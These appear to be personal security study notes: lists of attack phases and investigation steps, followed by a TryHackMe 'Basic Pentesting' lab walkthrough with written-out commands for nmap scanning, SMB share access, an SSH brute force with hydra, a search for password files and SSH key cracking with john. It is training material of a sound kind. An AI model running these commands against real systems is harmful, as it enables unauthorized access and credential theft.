Date : 14-05-2026

# Topic - Attack Flow

1. Target Selection
2. Attack surface discovery
3. Entry Vector Identification
4. Initial foothold
5. Privilege escalation
6. Lateral Movement
7. Objective execution
8. Persistence
9. Covering Tracks

# Topic - Investigation Flow

1. Define the problem
2. Gather Information
3. Reproduce the issue
4. Form hyptheses
5. Test one hypotheses at a time
6. Isolate root cause
7. Fix and verify
8. Documentation

# Topic - Attack surface Proioritization

1. Exposure level
2. Authentication boundaries
3. Input heavy components
4. High privilege functionality
5. Hidden services
6. Third party integrations

# Topic - Basic pentesting walkthrough
Basic Pentesting - TryHackMe Walkthrough

Target IP

```bash
export IP=10.10.x.x
```

Nmap Scan

```bash
nmap -sC -sV -A $IP
```

Open Ports Found
- 22 SSH
- 80 HTTP
- 139 SMB
- 445 SMB

SMB Enumeration

```bash
smbclient -L //$IP
```

Access anonymous share:

```bash
smbclient //$IP/Anonymous
```

Found possible usernames/files.

Web Enumeration

```bash
gobuster dir -u http://$IP -w /usr/share/wordlists/dirb/common.txt
```

Discovered hidden directories.

SSH Brute Force

```bash
hydra -l jan -P rockyou.txt ssh://$IP
```

Password discovered for user `jan`.

SSH Login

```bash
ssh jan@$IP
```

Privilege Escalation Enumeration

Check sudo permissions:

```bash
sudo -l
```

Search for credentials/history files:

```bash
find / -type f 2>/dev/null | grep -i pass
```

Found credentials for another user.

Switch User

```bash
su kay
```

Read User Flag

```bash
cat /home/kay/pass.bak
```

Crack SSH Key

```bash
ssh2john id_rsa > hash.txt
john hash.txt --wordlist=rockyou.txt
```

SSH as kay

```bash
ssh -i id_rsa kay@$IP
```

Capture final flag.

Key Learning Points
- SMB enumeration
- Web directory fuzzing
- Password attacks
- SSH access
- Privilege escalation basics
- Credential discovery

Tools Used
- nmap
- smbclient
- gobuster
- hydra
- john
- ssh
